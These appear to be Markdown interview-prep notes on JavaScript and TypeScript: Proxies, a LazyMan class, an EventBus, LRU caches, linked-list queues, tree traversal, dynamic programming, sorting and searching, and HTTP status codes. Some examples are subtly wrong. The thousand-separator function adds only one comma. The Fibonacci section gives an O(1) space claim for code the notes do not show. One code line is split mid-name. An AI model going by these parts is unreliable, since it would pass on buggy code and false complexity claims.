proxyList.push('Apple');  // Output: Adding 'Apple' to the list
proxyList.push('Banana'); // Output: Adding 'Banana' to the list
```

In this enhanced example, interactions with the `proxyList` trigger the appropriate handler within the `handler` object. Adding a new item to the list via the `push` method activates the `set` trap, which logs the operation and facilitates additional actions like validations or UI adjustments.

### Advantages of Using Proxies

- **Interception and Customization**: Proxies offer a powerful means to intercept and tailor the behavior of fundamental operations on objects, enabling the implementation of custom behaviors and checks.
- **Programmatic Validation**: They provide a mechanism for enforcing programmatic validation rules and constraints on object properties, enhancing data integrity and application robustness.
- **Change Detection**: Proxies are instrumental in detecting changes to objects and arrays, supporting reactive programming patterns by facilitating dynamic responses to data modifications.

## Implement `LazyMan` Class

The `LazyMan` class simulates a sequence of actions for an individual, incorporating actions such as eating or sleeping. Allows for the chaining of `eat` and `sleep` methods, improving code readability and flow. Utilizes JavaScript's event loop to introduce a delay with the `sleep` method before continuing to the next action, demonstrating asynchronous behavior.

```typescript
class LazyMan {
    private taskList: Array<Function>; // Holds a queue of tasks (actions) to be executed.
    private name: string;

    constructor(name: string) {
        this.name = name;
        this.taskList = [];
        setTimeout(() => { // Initiates task execution asynchronously.
            this.next();
        }, 0);
    }

    eat(food: string) {
        this.taskList.push(() => { // Queues an eating action.
            console.log(`eat ${food}`);
            this.next(); // Proceeds to the next queued action.
        });
        return this; // Facilitates method chaining by returning the LazyMan instance.
    }

    sleep(time: number) {
        this.taskList.push(() => { // Queues a sleeping action with a delay.
            setTimeout(() => {
                console.log(`wake up after ${time}`);
                this.next(); // Continues to the next action after the delay.
            }, time);
        });
        return this; // Allows for continued chaining.
    }

    next() {
        const fn = this.taskList.shift(); // Dequeues the next action.
        fn && fn(); // Executes the action if it exists.
    }
}

const me = new LazyMan('ronron');
me.eat('apple').sleep(1000).eat('banana').sleep(1000).eat('pear');
```
- **Chainable Methods**: Achieved by returning the instance itself (`this`) from each method, allowing for a fluent interface where methods can be called sequentially on the same object.
- **Asynchronous Execution**: Demonstrates the use of JavaScript's `setTimeout` to introduce execution delays, simulating sleep and showcasing asynchronous programming principles. The setTimeout in constructor initiates the asynchronous execution of the first task in the taskList, allowing for a delayed start of the queued actions.The first `this.next` actually starts when the synchronous code finishes, i.e. at `me.eat('apple').sleep(1000).eat('banana').sleep(1000).eat('pear');` line.

## Implementing a Custom EventBus

An **EventBus** is a design pattern that enhances loose coupling among components within software applications. This pattern allows components to communicate with each other without having direct dependencies or knowledge about each other, thereby promoting modularity and ease of integration.

### Methods
The EventBus pattern is implemented through several methods that manage the lifecycle of events and their listeners:

- **on(event: string, listener: Function)**: Registers a listener to an event. The listener can be triggered multiple times for as long as it remains bound to the event. It remains active until it is explicitly removed with the `off` method.

- **once(event: string, listener: Function)**: Similar to `on`, but the listener is designed to be triggered only once. After it is triggered, the listener is automatically removed. It can also be manually removed before it is triggered by using the `off` method.

- **emit(event: string, ...args: any[])**: Triggers all listeners bound to a specific event, passing along any arguments to the listeners.

- **off(event: string, listener: Function)**: Removes a specific listener from an event. This is crucial for managing the lifecycle of listeners and can be used for listeners registered with both `on` and `once`.

### Data Structure
Internally, the EventBus class uses a `Record<string, Function[]>` to maintain a map between event names and arrays of listener functions. This data structure ensures a systematic and type-safe way to manage event-listener relationships.

### Implementation in TypeScript
```typescript
class EventBus {
    private events: Record<string, Function[]>; // Stores event-to-listener mappings

    constructor() {
        this.events = {};
    }

    // Registers a listener for an event for multiple triggers
    on(event: string, listener: Function): void {
        if (!this.events[event]) {
            this.events[event] = [];
        }
        this.events[event].push(listener);
    }

    // Registers a listener for a single trigger on an event
    once(event: string, listener: Function): void {
        const onceListener = (...args: any[]) => {
            listener(...args); // Trigger the original listener
            this.off(event, onceListener); // Automatically remove after execution
        };
        this.on(event, onceListener); // Use `on` to bind the wrapper listener
    }

    // Triggers all listeners for an event, passing additional arguments
    emit(event: string, ...args: any[]): void {
        if (this.events[event]) {
            this.events[event].forEach(listener => listener(...args));
        }
    }

    // Removes a listener from an event
    off(event: string, listener: Function): void {
        if (this.events[event]) {
            this.events[event] = this.events[event].filter(l => l !== listener);
        }
    }
}

const eventBus = new EventBus();

// Bind the 'click' event
eventBus.on('click', () => console.log('clicked'));

// Bind the 'hover' event for a single-time execution
eventBus.once('hover', () => console.log('hovered'));

// Emit the 'click' event
eventBus.emit('click'); // Output: clicked

// Emit the 'hover' event
eventBus.emit('hover'); // Output: hovered
// Trying to emit 'hover' again will result in no output, as the once-bound listener is removed after execution

// Unbind the 'click' event
const clickListener = () => console.log('clicked');
// Note: This demonstrates the concept, but to successfully unbind, the original function reference must be used
eventBus.off('click', clickListener);
eventBus.emit('click'); // There will be no output if the exact function reference was used for both binding and unbinding
```

## Implementing the Least Recently Used (LRU) Cache Algorithm in JavaScript

The Least Recently Used (LRU) Cache Algorithm is a sophisticated caching mechanism designed to optimize memory usage in applications. It achieves this by maintaining a collection of the most recently accessed items and discarding the least recently used items once the cache reaches its specified capacity. This approach is particularly advantageous in scenarios where memory resources are limited and access patterns are highly variable. At the heart of an LRU Cache are two essential methods: `get` and `put`. 

The `get(key)` method retrieve the value associated with a specific key. Its behavior is twofold:
- **Found Key:** If the key exists in the cache, `get` returns its value. Additionally, it updates the cache to mark the key as recently accessed, effectively moving its associated value to the "end" of the cache, which symbolizes its recent use.
- **Missing Key:** If the key is not present in the cache, `get` returns `-1`, indicating that no value is associated with the key in the cache.

The `put(key, value)` method is responsible for inserting or updating key-value pairs in the cache. Its operation is guided by the following principles:
- **Existing Key:** If the key is already present in the cache, its value is updated, and its position is adjusted to reflect its recent use.
- **New Key with Full Cache:** If the key is new and the cache has reached its maximum capacity, the least recently used item is evicted to accommodate the new key-value pair. This ensures that the cache does not exceed its size limit while prioritizing the retention of recently accessed items.

Leveraging JavaScript's `Map` object, which naturally maintains the order of its elements based on insertion, we can efficiently implement an LRU Cache. The `Map` object's inherent ordering is utilized to track the recency of access for the cache's key-value pairs.

```typescript
class LRUCache {
    private capacity: number;
    private cache: Map<number, number>;

    constructor(capacity: number) {
        this.capacity = capacity; // Define the maximum size of the cache
        this.cache = new Map(); // Utilize a Map for its order-preserving properties
    }

    get(key: number): number {
        if (this.cache.has(key)) {
            const value = this.cache.get(key);
            this.cache.delete(key); // Remove the key to update its position
            this.cache.set(key, value); // Re-insert the key to mark it as recently used
            return value;
        }
        return -1; // Key not found
    }

    put(key: number, value: number): void {
        if (this.cache.has(key)) {
            this.cache.delete(key); // Prepare to update the key's position
        } else if (this.cache.size >= this.capacity) {
            // Cache is full, remove the least recently used item
            const leastUsedKey = this.cache.keys().next().value;
            this.cache.delete(leastUsedKey);
        }
        this.cache.set(key, value); // Insert or update the key-value pair
    }
}

const lruCache = new LRUCache(2); // Initialize a new LRU Cache with a capacity of 2

// Inserting key-value pairs
lruCache.put(1, 1); // Inserts (1, 1)
lruCache.put(2, 2); // Inserts (2, 2)

// Accessing stored values
console.log(lruCache.get(1)); // Outputs: 1 (key 1 is found)

// Inserting another key-value pair, causing the least recently used key (2) to be evicted
lruCache.put(3, 3); // Evicts key 2 and inserts (3, 3)

console.log(lruCache.get(2)); // Outputs: -1 (key 2 has been evicted)

// Further operations demonstrate the LRU eviction policy
lruCache.put(4, 4); // Evicts key 1 and inserts (4, 4)
console.log(lruCache.get(1)); // Outputs: -1 (key 1 has been evicted)
console.log(lru

Cache.get(3)); // Outputs: 3 (key 3 is found)
console.log(lruCache.get(4)); // Outputs: 4 (key 4 is found)
```

## Follow-up: Implementing LRU Cache Without Map or Record

Creating an LRU (Least Recently Used) cache in JavaScript without the built-in `Map` or `Record` types involves a more manual approach to managing memory and order of items. This method uses a hash table for quick access and a doubly linked list to efficiently keep track of the items' order, prioritizing the most recently used.

1. **Doubly Linked List:** Each node in the list corresponds to an item in the cache, equipped with pointers to both the preceding and subsequent items. This bidirectional linking enables quick additions, removals, and reordering of nodes based on access patterns, facilitating the LRU policy's requirement of moving recently accessed items to the forefront.

2. **Hash Table:** For the hash table, a simple JavaScript object (`{}`) suffices. The hash table offers constant-time complexity for key-based operations, such as lookups, insertions, and deletions. It stores references to the nodes in the doubly linked list, thereby bridging the gap between quick access and maintaining order.

```typescript
class ListNode {
    key: number;
    value: number;
    prev: ListNode | null = null;
    next: ListNode | null = null;

    constructor(key: number, value: number) {
        this.key = key;
        this.value = value;
    }
}

class LRUCache {
    private capacity: number;
    private hashTable: { [key: number]: ListNode };
    private head: ListNode | null;
    private tail: ListNode | null;

    constructor(capacity: number) {
        this.capacity = capacity; // Defines the cache's maximum size
        this.hashTable = {}; // Key-node reference storage
        this.head = this.tail = null; // Initial empty state for the doubly linked list
    }

    get(key: number): number {
        if (!(key in this.hashTable)) {
            return -1; // Key not found scenario
        }
        const node = this.hashTable[key];
        this.moveToHead(node); // Update access order
        return node.value;
    }

    put(key: number, value: number): void {
        if (key in this.hashTable) {
            const node = this.hashTable[key];
            node.value = value;
            this.moveToHead(node); // Refresh position
        } else {
            const newNode = new ListNode(key, value);
            if (Object.keys(this.hashTable).length === this.capacity) {
                this.removeLRUItem(); // Evict least recently used
            }
            this.hashTable[key] = newNode;
            this.addNode(newNode); // Insert at head
        }
    }

    private addNode(node: ListNode): void {
        // Prepends node to the doubly linked list
        node.next = this.head;
        node.prev = null;
        if (this.head) {
            this.head.prev = node;
        }
        this.head = node;
        if (!this.tail) {
            this.tail = node; // First node becomes both head and tail
        }
    }

    private removeNode(node: ListNode): void {
        // Detaches node from its current position in the list
        if (node.prev) {
            node.prev.next = node.next;
        } else {
            this.head = node.next; // Node is head
        }
        if (node.next) {
            node.next.prev = node.prev;
        } else {
            this.tail = node.prev; // Node is tail
        }
    }

    private moveToHead(node: ListNode): void {
        // Re-positions a node to the head after access
        this.removeNode(node);
        this.addNode(node);
    }

    private removeLRUItem(): void {
        // Evicts the least recently used node from the list's tail
        if (this.tail) {
            delete this.hashTable[this.tail.key]; // Cleanup hash table entry
            this.removeNode(this.tail); // Detach the node
        }
    }
}
```
# 3. Algorithms and Data Structures.md

## How is a linked list used in front-end development?
In front-end development, linked lists aren't commonly used, but a notable example is in React's Fiber architecture. React Fiber uses a linked list to manage the component tree instead of a traditional tree structure. This shift allows React to perform work in chunks and prioritize updates more effectively. The linked list structure enables incremental rendering, where the rendering work can be paused and resumed, improving app performance and user experience. It also facilitates the handling of concurrent operations in the UI, allowing for smoother and more responsive interfaces. Overall, while linked lists are not a standard tool in front-end development, their use in React Fiber demonstrates how they can optimize rendering and state management in complex applications

## implementing a queue using a linked list in TypeScript:
In TypeScript, you can implement a queue using a linked list by maintaining references to both the head and tail of the list. The queue operations work as follows:

Enqueue (Add to Queue): To add an item, you create a new node and attach it to the current tail of the linked list, then update the tail reference to this new node. If the queue is empty, this new node is both the head and tail.

Dequeue (Remove from Queue): To remove an item, you take the value from the head of the linked list and then update the head reference to the next node in the list. If the list becomes empty, update the tail reference to null as well.

This approach ensures that both enqueue and dequeue operations are O(1), providing efficient queue management. It’s important to handle edge cases, such as dequeueing from an empty queue, to avoid errors.

## Implement a queue in TypeScript, and is a linked list faster or an array?
In TypeScript, implementing a queue can be done using either an array or a linked list. An array-based queue is simple to implement but its dequeue operation (shift) is O(n) due to the need to shift elements. In contrast, a linked list implementation offers O(1) time complexity for both enqueue and dequeue operations, as it allows for constant-time insertions and deletions without reindexing.

So, while both can be used to implement a queue, a linked list is generally faster and more efficient for typical queue operations. This makes linked lists preferable in scenarios where frequent enqueue and dequeue operations are expected, whereas arrays might be more suitable when memory efficiency is a priority and operations are less frequent.

## implement a queue with linkedlist
```ts
interface ILinkedListNode {
    val: number;
    next: ILinkedListNode | null;
}

class Queue {
    // undefined usually used for uninitialized value, null for empty values, here null is better
    private head: ILinkedListNode | null;
    private tail: ILinkedListNode | null;
    private len: number;

    // use constructor instead of set values above, make code more readable
    // Inside class methods, use this to refer to instance variables 
    constructor(){
        this.head = null;
        this.tail = null;
        this.len = 0;
    }

    // for better clarity, mention return type void if return nothing
    offer(val: number): void {
        const temp: ILinkedListNode = {val: val, next: null};
        // in case the queue is empty, use === check value and type
        if (this.head === null) {
            this.head = temp;
            this.tail = temp;
        } 
        // normal case
        else {
            // avoid non-null assertions to avoid legitimate null/undefined errors, i.e. try avoid below commented code
            // this.tail!.next = temp;
            if (this.tail) {
                this.tail.next = temp;
            }
            this.tail = temp;
        }
        this.len += 1;
    }

    poll(): number | null {
        if (this.head === null) {
            return null;
        } 
        if (this.head.next === null) {
            this.tail = null;
        }
        // here use const instead of let, since it never changes
        const temp = this.head.val;
        this.head = this.head.next;
        this.len -= 1;
        return temp;
    }

    // with get keyword, we can use the return value as an attribute, e.g. const queue = new Queue(); const len = queue.size;
    get size(): number {
        return this.len;
    }
}
```

## In-order, pre-order and post-order
In the context of binary trees, in-order, pre-order, and post-order refer to the three primary ways to traverse the nodes of the tree, each with a different order for visiting the nodes.
**In-Order Traversal**: Left, Root, Right.
**Pre-Order Traversal**: Root, Left, Right.
**Post-Order Traversal**: Left, Right, Root.

## find the kth smallest value in a binary search tree
```ts
interface ITreeNode{
    val: number;
    left: ITreeNode | null;
    right: ITreeNode | null;
}

function findKthSmallest(root:ITreeNode, k: number): number | null {
    let count: number = 0;
    let result: number | null = null;

    // this function is in-order
    function dfsHelper(curNode: ITreeNode) {
        if (curNode === null || result !== null) return;

        dfsHelper(curNode.left);

        if (++count === k) {
            result = curNode.val;
            return;
        }

        dfsHelper(curNode.right);
    }

    dfsHelper(root);

    return result;
}
```

## Why binary tree so important, not trinary or quanary tree? 
While arrays provide faster access (O(1)), adding or deleting elements is less efficient (O(N)). Linked lists offer efficient insertion and deletion (O(1)), but slower access times (O(N)).

Compared to arrays and linked lists, binary trees offer a good balance with O(logn) time complexity for access, add, and delete operations when the tree is balanced.

Binary trees, as opposed to ternary or quaternary trees, provide a simpler and more efficient structure for most applications. They strike a balance between maintaining low complexity and achieving efficient operations.

## Why balancing binary tree so important?
An unbalanced binary tree can degenerate into a linked list, leading to O(N) time complexity for operations like add, delete, update, and search. A balanced binary tree, on the other hand, maintains a height of O(logn), ensuring that operations can be performed in logarithmic time. This balance is essential for leveraging the efficiency of binary trees, especially in scenarios where quick search, insertion, and deletion are frequently required.

## Why tree operations has time complexity of O(logn)?
`logn` represents the height of a balanced binary tree. In a balanced tree, each operation like search, insert, or delete involves traversing a path from the root to a leaf node, or vice versa. The number of levels (or height) of the tree determines the maximum number of steps needed for these operations. Since a balanced binary tree is structured to have a height that grows logarithmically with the number of nodes (n), the operations are significantly more efficient than linear time complexity, particularly for large datasets.

## What is a black-red tree? What is B tree? 
- **Red-Black Tree**: It is a type of self-balancing binary search tree. Each node in the tree is colored either red or black. The tree uses these colors along with specific rules to ensure that the tree remains balanced during insertions and deletions. The time complexity for balancing a Red-Black Tree during insertions and deletions is O(log n). This balancing act ensures that the tree maintains its O(logn) time complexity for operations. Red-Black Trees are particularly valued for their relatively simple balancing logic and efficient operations, making them suitable for various applications, including implementing associative arrays and priority queues.

- **B-Tree**: A B-Tree is a self-balancing tree data structure that maintains sorted data and allows searches, sequential access, insertions, and deletions in logarithmic time. Unlike binary trees, B-Trees are multi-way trees (having more than two children) and are optimized for systems that read and write large blocks of data, like databases and filesystems. They are designed to efficiently minimize disk I/O operations, and their branching factor (the number of child nodes) can be adjusted to optimize the balance between the tree's height and the number of nodes accessed per operation.

- **B+ Tree**: A variant of the B-Tree, the B+ Tree, is commonly used in databases and file systems. It maintains data in the leaf nodes, while the internal nodes store only keys for navigation. This design allows for efficient range queries and sequential access, making B+ Trees well-suited for systems that require high-performance data retrieval. See https://blog.csdn.net/Weixiaohuai/article/details/109493541

Both Red-Black Trees and B-Trees are advanced tree structures designed to optimize performance for different scenarios, with Red-Black Trees often used in memory and B-Trees in disk-based storage systems.

## Identify whether a string is prefix of a word in dictionary
A Trie, or a prefix tree, is an optimal data structure for this problem. It stores strings in a tree-like structure, where each node represents a character of a string. The root represents an empty string, and each path from the root to a leaf node represents a word.

To check if a string is a prefix of any word in the dictionary, we insert each word into the Trie. Then, for the given string, we traverse the Trie from the root. If we can traverse the Trie following the characters of the string without any breaks, and reach a node (not necessarily a leaf node), then the string is a valid prefix in the dictionary.

This approach is efficient in terms of time complexity, especially for multiple prefix searches, as each search is only as long as the length of the string being searched.

e.g. word apple may looks like this: {a: {p: {p: {l: {e: null}}}}}

The time complexity for this is O(m) where m is the length of the string

## Depth-First Search (DFS) of a DOM Tree
Depth-First Search (DFS) is a method used to traverse or search a tree or graph data structure. The algorithm starts at the root node and explores as far as possible along each branch before backtracking. When applied to a DOM tree, DFS will visit each node in a manner that deeply explores a node's children before moving to its siblings.

The given TypeScript function `dfs` illustrates how DFS can be applied to a DOM tree. The `visitNode` function is used to log different types of nodes (Comment, Text, HTMLElement). In the `dfs` function, recursion is utilized to visit each node starting from the root, exploring all its child nodes deeply before moving to the next sibling.

```typescript
function visitNode(node: Node) {
    if (node instanceof Comment) {
        console.log('comment', node.textContent);
    }
    if (node instanceof Text) {
        const t = node.textContent.trim();
        if (t) {
            console.log('text', t);
        }
    }
    if (node instanceof HTMLElement) {
        console.log('element', node.tagName);
    }
}

function dfs(node: Node) {
    visitNode(node);
    node.childNodes.forEach((child) => {
        dfs(child);
    });
}
```

### Without Recursion
DFS can be implemented without recursion by using a stack to simulate the call stack of recursion. This approach avoids potential stack overflow errors that may occur with deep recursion. While recursion is more straightforward and readable, using a stack can be more efficient and safer for deep trees.

```typescript
function dfsWithoutRecursion(node: Node) {
    const stack = [node];
    while (stack.length) {
        const n = stack.pop();
        visitNode(n);
        Array.from(n.childNodes).reverse().forEach((child) => {
            stack.push(child);
        });
    }
}
```

## Breadth-First Search (BFS) of a DOM Tree
Breadth-First Search (BFS) is another method to traverse or search a tree or graph data structure. Unlike DFS, BFS explores all the neighbor nodes at the present depth prior to moving on to the nodes at the next depth level. Applied to a DOM tree, BFS will visit each node level by level.

The `bfs` function demonstrates how BFS can be applied to a DOM tree. It uses a queue to visit each node at the current level before moving to the nodes at the next level. This approach ensures that nodes are visited in a breadth-wise manner.

```typescript
function bfs(node: Node) {
    const queue = [node];
    while (queue.length) {
        const n = queue.shift();
        visitNode(n);
        n.childNodes.forEach((child) => {
            queue.push(child);
        });
    }
}
```

### Key Differences Between DFS and BFS
- **DFS** dives as deep as possible into the tree's branches before backtracking, which can be implemented either recursively or using a stack.
- **BFS** visits all nodes at the current level before moving to the next level, using a queue to keep track of the order.

## Array to Tree and Tree to Array Conversion
### TreeNode and ArrayItem Interfaces
```typescript
interface TreeNode {
    id: number;
    name: string;
    children?: TreeNode[];
}

interface ArrayItem {
    id: number;
    parentId: number;
    name: string;
}
```

### Array to Tree Conversion
```typescript
function arrayToTree(arr: ArrayItem[]): TreeNode | null {
    const map = new Map<number, TreeNode>();
    let root: TreeNode | null = null;

    // sort by parentId to ensure parent nodes are processed before children
    arr.sort((a, b) => a.parentId - b.parentId);

    arr.forEach(item => {
        const {id, parentId, name} = item;
        const treeNode: TreeNode = {id, name, children: []};
        map.set(id, treeNode);

        if (parentId === 0) {
            root = treeNode;
        } else {
            const parent = map.get(parentId);
            parent?.children.push(treeNode);
        }
    });

    return root;
}
```

### Tree to Array Conversion
```typescript
function treeToArray(tree: TreeNode): ArrayItem[] {
    const result: ArrayItem[] = [];

    function traverse(node: TreeNode, parentId: number) {
        const {id, name, children} = node;
        result.push({id, parentId, name});
        children?.forEach(child => traverse(child, id));
    }

    traverse(tree, 0);
    return result;
}
```

### Contextual Understanding
- **Relational Databases**: Such as PostgreSQL, typically store data in a tabular format with rows and columns, which resembles the flat array structure. This format is efficient for operations that involve relations between different entities.
  
- **Non-relational Databases**: For instance, MongoDB, often store data in formats akin to the tree structure, like documents in BSON format. This structure is advantageous for storing nested or hierarchical data, such as comments on a post or categories with subcategories.

## What is dynamic programing
- Dynamic programming involves breaking down a complex problem into smaller, overlapping subproblems, solving these down to the simplest base cases. 
- It uses recursion with memoization, or iterative methods with tabulation, to optimize by preventing redundant computations.

## Write a recursive function and a non-recursive return the nth fibonacci number, explain why the recursive one may crash
### Recursive Implementation:
```ts
// method one, recursive
function fibonacci(n: number): number {
    if (n === 0) return 0;
    if (n === 1) return 1;
    return fibonacci(n - 1) + fibonacci(n - 2)
}
```
In the recursive Fibonacci function, each function call is added to the call stack, a special region in memory where function call information is stored. When `n` is large, this results in a very deep recursion, where each call to `fibonacci` leads to two more calls, exponentially increasing the number of calls on the stack. This can quickly exceed the memory limit of the stack, leading to a stack overflow error. This happens because the stack has a limited size and cannot accommodate the large number of nested function calls required by the recursive approach for large values of `n`.

- **Time Complexity: O(2^n)**

  Each call to `fibonacciRecursive` generates two more calls, except for the base cases. This exponential growth results in a time complexity of O(2^n), where `n` is the input number.

  e.g. we want to calculate f(8)  
  f(8) = f(7) + f (6), and f(7) = f(6) + f(5)  
  Therefore, F(6) is calculated twice which is redundant computations

- **Space Complexity: O(n)**

  The space complexity is determined by the height of the call stack, which in the worst case (when `n` is large) will have `n` calls stacked on top of each other before reaching the base case. This results in a space complexity of O(n).

### Dynamic Programming Implementation:
```ts
// method 2, dynamic programming
function fibonacci(n: number): number {
    if (n < 0) return -1;
    if (n === 0) return 0;
    if (n === 1) return 1;
    const dp = [0, 1];
    for (let i = 2; i <= n; i++) {
        dp[i] = dp[i - 1] + dp[i - 2];
    }
    return dp[n];
}
```
The dynamic programming solution avoids the issue of stack overflow by storing the results of subproblems in an array (`dp`) and reusing them when needed. This approach has a time complexity of O(n) and a space complexity of O(n), making it more efficient and suitable for calculating large Fibonacci numbers.

- **Time Complexity: O(n)**

  The function iterates from 2 to `n` once, performing a constant amount of work in each iteration. Therefore, the time complexity is linear, O(n).

- **Space Complexity: O(1)**

  The iterative solution uses a fixed amount of space (the variables `prevprev`, `prev`, and `result`). This amount of space does not change as `n` increases, making the space complexity constant, O(1).

## A frog, can jump 1 or 2 steps each time. How many ways can i jump a n step stair? 
```ts
function frogJumpDP(n: number): number {
    // only one way to go to step 0 which is doing nothing
    if (n === 0) return 1;
    // the first 1 is for simplicity of calculation so that dp[2] will be 2
    // the second 1 is only one way to go to stair 1
    const dp = [1, 1];
    for (let i = 2; i <= n; i++) {
        dp[i] = dp[i - 1] + dp[i - 2];
    }
    return dp[n];
}
```

## 01 Knapsack Problem
In the 0-1 Knapsack problem, you are given a set of items, each with a weight and a value. The goal is to determine the maximum value of items that can be packed into a knapsack with a limited carrying capacity. Each item can either be included in its entirety or excluded; partial items are not allowed.

```java
public class Knapsack01 {

    /**
     * Calculates the maximum value that can be packed into the knapsack.
     *
     * @param W the maximum weight capacity of the knapsack
     * @param weights array of item weights
     * @param values array of item values
     * @param n number of items
     * @return the maximum value that fits in the knapsack
     */
    public static int knapsack(int W, int[] weights, int[] values, int n) {
        // dp[w] will hold the maximum value that can be attained with a knapsack capacity of w
        int[] dp = new int[W + 1];

        // Process each item
        for (int i = 0; i < n; i++) {
            // Iterate through all capacities from max to the weight of the current item
            for (int w = W; w >= weights[i]; w--) {
                // Update dp[w] to the maximum of itself and the value of taking item i
                dp[w] = Math.max(dp[w], dp[w - weights[i]] + values[i]);
            }
        }

        return dp[W];
    }

    public static void main(String[] args) {
        int[] weights = {1, 3, 4};
        int[] values = {1500, 2000, 3000};
        int W = 4; // Maximum weight capacity of the knapsack
        int n = weights.length; // Number of items

        int maxVal = knapsack(W, weights, values, n);
        System.out.println("Maximum value that can be packed: " + maxVal);
    }
}
```

#### Key Concepts Explained

- **Dynamic Programming Array (`dp`)**: The `dp` array is central to the solution, where `dp[w]` represents the maximum value that can be achieved with a knapsack capacity of `w`.
- **Iteration Order**: It's crucial to iterate the weights in reverse when considering each item, as this ensures that each item is only considered once per capacity.
- **Item Processing**: For each item, we compare the maximum value of not taking the item (`dp[w]`) versus taking the item (`dp[w - weights[i]] + values[i]`), thus ensuring that we always store the best solution for every capacity.

## Array Flattening Function in JavaScript
Array flattening is the process of converting a nested array into a single-dimensional array. 

```ts
function arrayFlatten(arr: any[]): any[] {
    let flattenedArray = [];
    for (let i = 0; i < arr.length; i++) {
        if (Array.isArray(arr[i])) {
            flattenedArray = flattenedArray.concat(arrayFlatten(arr[i])); 
        } else {
            flattenedArray.push(arr[i]);
        }
    }
    return flattenedArray;
}

function arrayFlatten(arr: any[]): any[]{
    return arr.reduce((prev, cur) => {
        return prev.concat(Array.isArray(cur) ? arrayFlatten(cur) : cur);
    }, []);
}
```




## Implement binary search and describe time complexity
```ts
// assume input nums is in ascending order, return the index or null if not found
function binarySearch(nums: number[], target: number): number | null {
    let left: number = 0;
    let right: number = nums.length - 1;
    // use <= for case length = 1
    while (left <= right) {
        // Use Math.floor to avoid floating point values for the mid index.
        let mid: number = Math.floor((left + right) / 2);
        if (nums[mid] === target) {
            return mid;
        }
        if (nums[mid] > target) {
            right = mid - 1;
        } else {
            left = mid + 1;
        }
    }
    return null;
}
```
Binary search has a time complexity of O(log n), where n is the number of elements in the array. This is because the algorithm divides the search interval in half with each step.

## Given an ascending number array and a number n, find 2 numbers in array sum is n. 
```ts
function twoSumsAscending(nums: number[], target: number): number[]{
    let left: number = 0;
    let right: number = nums.length - 1;
    // Use '<' instead of '<=' to prevent the same element from being used twice
    while (left < right) {
        if (nums[left] + nums[right] === target) {
            return [nums[left], nums[right]];
        }
        if (nums[left] + nums[right] < target) {
            left++;
        } else {
            right--;
        }
    }
    return [];
}
```

## Move all zeros in an array to its end 
- maintaining the order of the non-zero elements. 
- The operation should be performed in-place
```ts
function moveZeroToEnd(nums: number[]): void {
    let zeroStart: number = -1;
    for (let i = 0; i < nums.length; i++) {
        if (nums[i] !== 0 && zeroStart !== -1) {
            nums[zeroStart] = nums[i];
            nums[i] = 0;
            zeroStart++;
        } else if (nums[i] === 0 && zeroStart === -1) {
            zeroStart = i;
        }
    }
}
```

## Identify the longest sequence of a continuous character in a given string. 
For example, for the string 'aabaacceee', the function should return 'e'.
```ts
interface IRes {
    char: string;
    len: number;
}

function findLongest(s: string): IRes {
    if (s.length === 0) return { char: '', len: 0 }; // Handle empty string

    let longestChar: string = s.charAt(0);
    let longest: number = 1;
    let currentChar: string = s.charAt(0);
    let currentLength: number = 1;

    for (let i = 1; i < s.length; i++) {
        if (s.charAt(i) === currentChar) {
            currentLength++;
        } else {
            if (currentLength > longest) {
                longest = currentLength;
                longestChar = currentChar;
            }
            currentChar = s.charAt(i);
            currentLength = 1;
        }
    }

    // Check and update for the last character sequence
    if (currentLength > longest) {
        longest = currentLength;
        longestChar = currentChar;
    }

    return { char: longestChar, len: longest };
}

```

## Implement quicksort in typescript
```ts
function quickSort(nums: number[]): number[] {
    if (nums.length <= 1) return nums;

    const midInd = Math.floor(nums.length / 2);
    // array.splice(a, b) removes b elements starting from index a from the array. The return value is an array of the removed elements.
    const mid = nums.splice(midInd, 1)[0];

    const left: number[] = []
    const right: number[] = []
    for (let i = 0; i < nums.length; i++) {
        if (nums[i] < mid) {
            left.push(nums[i]);
        } else {
            right.push(nums[i]);
        }
    }

    return quickSort(left).concat([mid], quickSort(right));
}
```

- **Average Case (O(n log n))**: In the average case, the pivot divides the array into two roughly equal parts, leading to a logarithmic number of recursive calls (log n). In each level of recursion, the algorithm performs O(n) operations to partition the array around the pivot. Thus, the average case is O(n log n).

- **Worst Case (O(n²))**: The worst case occurs when the pivot is the smallest or largest element in each recursive call, leading to unbalanced partitions. This results in n recursive calls, each doing O(n) work, thus O(n²).

## find palindrome number
Palindrome number, e.g. 1, 2, 22, 101, 10001, 20002, 2002 etc
```ts
function findAllPalindromeNumbers(max: number): number[] {
    const res = []

    for (let i = 0; i <= max; i++) {
        // find reversed number first, then compare
        let reversedNum: number = 0, temp: number = i;
        while (temp !== 0) {
            reversedNum *= 10;
            reversedNum += temp % 10;
            temp = Math.floor(temp / 10);
        }
        if (reversedNum === i) {
            res.push(i);
        }
    }

    return res;
}

function findAllPalindromeNumbers(max: number): number[] {
    const res = [];

    for (let i = 0; i < max; i++) {
        const s = i.toString();
        let start = 0, end = s.length - 1;
        let isPalindrome = true;
        while (start < end) {
            if (s.charAt(start++) !== s.charAt(end--)) {
                isPalindrome = false;
                break;
            }
        }
        if (isPalindrome) res.push(i);
    }

    return res;
}
```


## formatting numbers into a thousand separator style (e.g., "1,000", "12,000,000")
```ts
function format(num: number): string{
    let res: string = "";
    const s: string = num.toString();
    let count: number = 0;
    for (let i = s.length - 1; i >= 0; i--) {
        if (++count === 3 && i !== 0) {
            res = "," + res;
        }
        res = s.charAt(i) + res;
    }
    return res;
}
```

## Switch letter case, e.g. aBc123D -> AbC123d
```ts
function switchLetterCase(s: string): string {
    let res = ""

    // according to ascii table, A-Z is 65-90, a-z is 97-122
    const UPPER_CASE_A = 65;
    const UPPER_CASE_Z = 90;
    const LOWER_CASE_A = 97;
    const LOWER_CASE_Z = 122;

    for (let i = 0; i < s.length; i++) {
        const code = s.charCodeAt(i);
        if (code >= UPPER_CASE_A && code <= UPPER_CASE_Z) {
            // Convert to lower case
            res += String.fromCharCode(code + 32); 
        } else if (code >= LOWER_CASE_A && code <= LOWER_CASE_Z) {
            // Convert to upper case
            res += String.fromCharCode(code - 32); 
        } else {
            // Non-alphabetic characters are unchanged
            res += s.charAt(i); 
        }
    }

    return res
}
```






# 4. Network Systems.md

## HTTP Status Codes
### 1xx: Informational
- **100 Continue**: Indicates that the initial part of a request has been received and the client should continue with the request.

### 2xx: Success
- **200 OK**: The request has succeeded. The information returned with the response depends on the method used in the request.
- **201 Created**: The request has been fulfilled and has resulted in one or more new resources being created.
- **204 No Content**: The server successfully processed the request, but is not returning any content.

### 3xx: Redirection
- **301 Moved Permanently**: This response code means that the URI of the requested resource has been changed permanently.
- **302 Found**: This response code means that the URI of the requested resource has been changed temporarily.
